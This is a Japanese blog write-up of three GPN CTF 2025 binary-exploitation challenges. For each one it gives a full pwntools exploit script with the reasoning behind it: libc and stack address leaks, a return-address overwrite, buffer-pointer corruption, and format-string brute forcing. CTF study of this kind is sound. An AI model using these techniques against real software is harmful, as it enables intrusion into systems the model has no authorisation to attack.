+++
date = 2025-06-27
title = "GPN CTF 2025 Writeup"
[taxonomies]
tags = ["CTF"]
+++

## すいません。眠いです。
眠いので適当な文章を書いています。すいません推敲していません。  

---

## NASA
writeupを読んだ。  
どうやらASanの所為で、`option`変数はshadow stackにあり、実際のスタックには無いため、このアドレスは参考にならないという話だった。  
競技中はASanのShadow Stackをずっと掘っており、全く違うことをしていたと気づいて横転した。  
とりあえずlibcを使うexploitなので、dockerがホストしている環境のlibcを解析する。  

```
docker cp aa9c9cc2a66e:/lib/x86_64-linux-gnu/libc.so.6 .
```

これで手元にlibcが落ちてくるからpwntoolsに食わせる。  
2の`read`で`elf.got['system']`を送信して`system`のアドレスをリーク。(なぜか`puts`等ではうまくlibc baseが算出出来なかったがASanが悪さをしている?)  
リークした`system`から、相対オフセットを引くことでlibcベースがリーク。  
libcベースがリークしたことによって`environ`の位置がlibcベースから算出できる。  
また、`environ`を2の`read`することで、今のスタックがどこに位置しているか判明する。 
競技中は、`option`変数の位置こそ提示されているが、これ自体はShadow Stackにあり、実際のスタックにないため、スタックのアドレス(位置)を取得するのに一生苦労していた。  
どうやら`environ`は環境変数へのポインタの配列、これの先頭を持つポインタらしい。  
これらポインタの配列はスタックに配置されるため、これからアドレス下位に下がっていくと、現在のスタックフレームを参照できたりするらしい。  
`environ`でスタックのアドレスをリークした後、GDBでスタックを除き、リークした値と、mainのリターンアドレスとの差を計算してみる。  

```
これはexploit実行時に、environが持つアドレスとしてリークしたもの
environ: 7ffc22e40388

pwndbg> x/50gx $rsp
0x7ffc22e40160:	0x7776757473727170	0x7f7e7d7c7b7a7978
0x7ffc22e40170:	0x8786858483828180	0x8f8e8d8c8b8a8988
0x7ffc22e40180:	0x9796959493929190	0x9f9e9d9c9b9a9998
0x7ffc22e40190:	0xa7a6a5a4a3a2a1a0	0xafaeadacabaaa9a8
0x7ffc22e401a0:	0xb7b6b5b4b3b2b1b0	0xbfbebdbcbbbab9b8
0x7ffc22e401b0:	0xc7c6c5c4c3c2c1c0	0xcfcecdcccbcac9c8
0x7ffc22e401c0:	0xd7d6d5d4d3d2d1d0	0x000071474bce17bb
0x7ffc22e401d0:	0x000071474be90248	0x000071474bce17bb
0x7ffc22e401e0:	0x000071474be8fdc8	0x000071474be8f880
0x7ffc22e401f0:	0x00007ffc22e40220	0x00007ffc22e40230
0x7ffc22e40200:	0x000071474be91f00	0x7db64fcf6fadbe00
0x7ffc22e40210:	0x0000000000000001	0x7db64fcf6fadbe00
0x7ffc22e40220:	0x0000000000000001	0x0000000000000000
0x7ffc22e40230:	0x00007ffc22e402f0	0x00007ffc22e40378
0x7ffc22e40240:	0x0000000000000001	0x000071474ca05000
0x7ffc22e40250:	0x0000612e61a62d18	0x000071474c0376b5
0x7ffc22e40260:	0x0000000000000008	0x00007ffc22e40378
0x7ffc22e40270:	0x0000000100000000	0x0000612e61a60376
0x7ffc22e40280:	0x0000000000000000	0xd535bf6c9bd293cd
0x7ffc22e40290:	0x00007ffc22e40378	0x0000000000000001
0x7ffc22e402a0:	0x000071474ca05000	0x0000612e61a62d18
0x7ffc22e402b0:	0xd535bf6c9af293cd	0xc84362a272ec93cd
0x7ffc22e402c0:	0x00007ffc00000000	0x0000000000000000
0x7ffc22e402d0:	0x0000000000000000	0x0000612e61a62d10
0x7ffc22e402e0:	0x00007ffc22e40350	0x7db64fcf6fadbe00
pwndbg> retaddr
0x7ffc22e40258 —▸ 0x71474c0376b5 (__libc_start_call_main+117) ◂— mov edi, eax
0x7ffc22e402f8 —▸ 0x71474c037769 (__libc_start_main+137) ◂— mov r14, qword ptr [rip + 0x1be820]
0x7ffc22e40358 —▸ 0x612e61a60245 (_start+37) ◂— hlt 
```
`0x7ffc22e40388 - 0x7ffc22e40258 = 0x130`より差は`0x130`だった。  
つまり、`read`で`environ`を読んだ時に出てくるアドレスから`0x130`を引いた値がリターンアドレスの位置になるため、あとは`write`でそこに`win`のアドレスを書き込んで`exit`で終了すれば`win`が実行される。  

```python
from pwn import *
context.log_level = 'error'
elf = context.binary = ELF('./nasa')
#libc = elf.libc
libc = ELF('./libc.so.6')
#p = process('./nasa')
p = remote('localhost', 1337)

addr_of_option = int(p.recvline().strip(), 16)
addr_of_win = int(p.recvline().strip(), 16)
elf.address = addr_of_win - elf.sym['win']

print(f'binary base: {hex(elf.address)}')
print(f'option: {hex(addr_of_option)}')
print(f'win: {hex(addr_of_win)}')

p.recvline()
p.sendline(b'2')
p.recvline()
p.sendline(f'{hex(elf.got['system'])}'.encode())

leaked_system = int(p.recv(12), 16)
libc.address = leaked_system - libc.sym['system']
print(f'libc base: {hex(libc.address)}')

p.recvline()
p.sendline(b'2')
p.recvlines(2)
p.sendline(f'{hex(libc.sym['environ'])}'.encode())
retaddr_address = int(p.recv(12), 16) - 0x130

p.recvlines(2)
p.sendline(b'1')
p.recvline()
p.sendline(f'{hex(retaddr_address)} {hex(addr_of_win)}'.encode())
p.recvline()
p.sendline(b'3')
p.recvline()

print(p.recvall().decode('latin-1'))
```

## Note Editor
プログラムを読み解いていく。noteの構造体は以下。  

```c
#define NOTE_SIZE 1024
struct Note {
    char* buffer;
    size_t size;
    uint32_t budget; 
    uint32_t pos; 
};
typedef struct Note Note;
```

```c
int main() {
    Note note;
    char buffer[NOTE_SIZE];
    
    note = (Note) {
        .buffer = buffer,
        .size = sizeof(buffer),
        .pos = 0, // -> bufferでのoffsetを持っていると思われる。書き込み位置
        .budget = sizeof(buffer) // -> 残りのバッファサイズ?
    };
	
	//これは setvbufとかの設定で関係ない
    setup();
    // bufferをsizeのbyte分だけ0埋め、budget = size、pos=0にする
    reset(&note);
    
    printf("Welcome to the terminal note editor as a service.\n");

	// メニューは1-6以外を受け付けていない
    while (1)
    {
        uint32_t choice = menu();
        switch (choice)
        {
        case 1: // <- 問題なさそう
            reset(&note);
            break;
        case 2: // <- 問題なさそう
            printf("Current note content:\n\"\"\"\n");
            puts(note.buffer);
            printf("\"\"\"\n");
            break;
        case 3: // <- 一見して問題無さそう
            append(&note);
            break;
        case 4:
            edit(&note);
            break;
        case 5:
            truncate(&note);
            break;
        case 6: // fall trough to exit <-問題無さそう
            printf("Bye\n");
            return 0;
        default:
            printf("Exiting due to error or invalid action.\n");
            exit(1);
        }
    }
}
```

appendは以下。  

```c
void append(Note* note) {
    printf("Append something to your note (%u bytes left):\n", note->budget);
    fgets(note->buffer + note->pos, note->budget, stdin);
    uint32_t written = strcspn(note->buffer + note->pos, "\n") + 1;
    note->budget -= written;
    note->pos += written;
}
```

`budget`は残りのバイト数として機能している。  
`append`は`buffer+pos`の位置に書き込んでいる。  
サイズは`budget`であり、`stdin`から入力を受け取る。  
strcspnは改行を探し、それまでの文字数+1の数を書き込んだとして記録する。  
例えば`Hello, World!\n`は全体で14文字であり、`budget`からは14引かれるし、`pos`には14足される。(0-13までを使ってるため、次に書き込む位置は14であり、正しい)  
`strcspn`はバッファに指定した文字が現れるまでの文字数を数える。  
`hello, world`で`o`を探したら、0オリジンで4が返ってくる。  
もし見つからない場合、バッファの長さが返ってくる。  

```c
char *buf = "Hello, world!\n";
int num = strcspn(buf, "o");
// -> num = 4

char *buf = "Hello, world!\n";
int num = strcspn(buf, "a");
// -> num = 14

char *buf = "Hello, world!\n";
int num = strcspn(buf, "\n");
// -> num = 13
```

あとfgetsが特殊
```c
char *fgets(char* s, int size, FILE *restrict stream) {
    char* cursor = s;
    for (int i = 0; i < size -1; i++) {
        int c = getc(stream);
        if (c == EOF) break;
        *(cursor++) = c;
        if (c == '\n') break;
    }
    // *cursor = '\0'; // our note is always null terminated
    return s;
}
```

`edit`は以下。  

```c
void edit(Note* note) {
    printf("Give me an offset where you want to start editing: ");
    uint32_t offset;
    SCANLINE("%u", &offset);
    printf("How many bytes do you want to overwrite: ");
    int64_t length;
    SCANLINE("%ld", &length);
    if (offset <= note->pos) {
        uint32_t lookback = (note->pos - offset);
        if (length <= note->budget + lookback) {
            fgets(note->buffer + offset, length + 2, stdin); // plus newline and null byte
            uint32_t written = strcspn(note->buffer + offset, "\n") + 1;
            if (written > lookback) {
                note->budget -= written - lookback;
                note->pos += written - lookback;
            }
        }
    } else {
        printf("Maybe write something there first.\n");
    }
}
```

`offset`は`pos`以下でなければならない。  

```
 hello, world!\n_______
|                |
+----------------+
 ここまで
``` 

`lookback`は`pos-offset`となる。  

```
もしoffset=5だとしたら
                pos 14
                |
 hello, world!\n_______
      |
      offset 5

lookback = 9
```

`length`は`budget+lookback`以下でなければならない。  
`budget`を超えないように、現在の`pos`の位置からoffsetがどれほど前に行くのかによって、渡された`length`を判定している。  

```
budget = 1024-14 = 1010
length <= budget + lookback = 1019 = true
```

それと、NULLbyteがついているから`length+2`だみたいなことを言っているが、NULLはどこで付与されているのだろうか。`fgets`にも付与されてはいなかった。  
2で読み出す際、`puts`で読み出しており、NULLがあるなら止まるはずである。スタックを確認したが、ナルはなかった。  
ここで注目したいのは`edit`の`fgets`が、`length+2`までを入力として許容する、かつ`length<=1024`であることから、入力は最大`1026`バイトまで許容するということ。  
そして、`buffer`の先には、実は`buffer`自体の先頭アドレスが配置されているため、`buffer`が位置するアドレスの下位2バイトを上書きできるということ。(つまり、`buffer`の開始アドレスをずらして誤認させられる。)  
この際に以下の内容を送りつけてみると面白いことが起きる。  

- `offset: 0`
- `length: 1024`
- `input: A*1024 + \xff`

`1024`の`A`と`FF`を送りつけた時点で、大体の場合`pos`が`1024`に近い数値になっている。  
`budget`は少ない(実際は違うがとりあえず0と考える)。  
2回目の`edit`では、`offset <= pos`かつ`length =< budget+(pos-offset)`なので、`offset <= 1024`, `length <= 1024-offset`と考えられる。  
つまり、`offset`は`1024`以下で許可され、`length`は`1024-offset`で許可される。
仮に`offset`を`512`程度にした場合、`length`も`512`バイト程度許される。  
そして、`buffer`の開始アドレスの下位を`ff`にしているため、何度か実行すれば`buffer`の開始アドレスがスタックの上位アドレスにずれることになる(元々の開始アドレスの下位がffよりかなり小さい場合)。  
こうなると`offset`は確かに`buffer`の中央程度を指していることになり、そこから半分上書きしたとて、「開始位置をずらした`buffer`の限界(1024)」を超えることは難しいが、「本来のレイアウトにおける`buffer`の限界」は超えることが可能になる。  
そして、本来のレイアウトの先にはリターンアドレスがあるため、これを上書きすることが、本来の`buffer`の下位1byteの値によっては可能になるというアイデア。  
なのでもちろん2回目の`edit`は`win`のアドレスを敷き詰めている。また、下位を`ff`にずらしている以上、8byteにアラインされていないため、1byte余分に敷き詰めるか`offset`を7byte下げるかのどちらかをしないと、`win`のアドレスが整列しないため、`offset`は505バイトにして、`length`を512バイト(アドレス64個分)に設定しておいた。  

```python
from pwn import *

elf = context.binary = ELF('./chall')
p = process('./chall')
#p = remote("ironshire-of-mega-ultra-industry.gpn23.ctf.kitctf.de", "443", ssl=True)

p.recvuntil(b'6. Quit\n')
p.sendline(b'4')
p.recvuntil(b':')
p.sendline(b'0')
p.recvuntil(b':')
p.sendline(b'1024')
payload = b'A'*1024 + b'\xff' 
p.send(payload)

p.recvuntil(b'6. Quit\n')
p.sendline(b'4')
p.recvuntil(b':')
p.sendline(b'505')
p.recvuntil(b':')
p.sendline(b'512')
payload = p64(elf.sym['win']) * 64
p.sendline(payload)

p.recvuntil(b'6. Quit\n')
p.sendline(b'6')

p.interactive()
```

`GPNCTF{NOW_yOU_5uRE1Y_ARE_RE4dY_7O_PWn_LaDybIRD!}`

## no-nc
入力に`. / n c`が入っていると入力を受け付けない。  
どうやらファイル自体にフラグがあり、また実行バイナリは`/nc`にあるらしい。  
また、Dockerfileに`RUN gcc nc.c -o /nc -DRAW_FLAG="$FLAG"`という記述があり、`-DRAW_FLAG="$FLAG"`は`$FLAG`環境変数にある文字列を`RAW_FLAG`に注入している。  
これコマンドライン引数だから、これを持っているメモリ領域を見たらフラグが見えるのでは？  

```
snprintf(filename, (sizeof filename)-1, buf);
本来bufの箇所は "%s", buf のように書かれるはずだが、bufだけになっているので書式文字列の脆弱性がある。
bufの箇所で指定された文字列(本来は書式文字列)が、(sizeof filename)-1だけfilenameに書き込まれる
```

というか`sizeof filename`はどう考えても8byteになってしまっており、1引いているので、7byteしか書き込めないことが分かる。  

```
calloc(200, 1);
ヒープに1byteの配列が200個作成
```

結局、書式文字列をブルートフォースしたら、なぜかバイナリファイル自体が読めてしまった。  
どうやら`%71$s`で`./nc`という文字を読んだらしい。  
これがそのまま`open("%71$s", 0)`に渡され、`open`がこれを`./nc`に展開し、実行バイナリをそのまま読み込んだため、バイナリにハードコードされているフラグが読めたということになる。  

```python
from pwn import *

context.log_level = 'error'

def bruteforce():
    i = 0
    for i in range(0, 9999):
        p = remote("mountdale-of-epic-riches.gpn23.ctf.kitctf.de", "443", ssl=True)
        print(f'trying {i}')
        #p = remote('localhost', 1337)
        p.recvline() # give me a file to read
        payload = f'%{i}$s'
        p.send(payload)
        candidate = p.recvall().decode('latin-1')
        if 'GPN' in candidate:
            print(candidate)
            break

bruteforce()
```

`GPNCTF{up_and_D0wN_A11_ARound_60es_TH3_N_dIM3n5I0NA1_Circ13_WTf_Is_THis_flA6}`
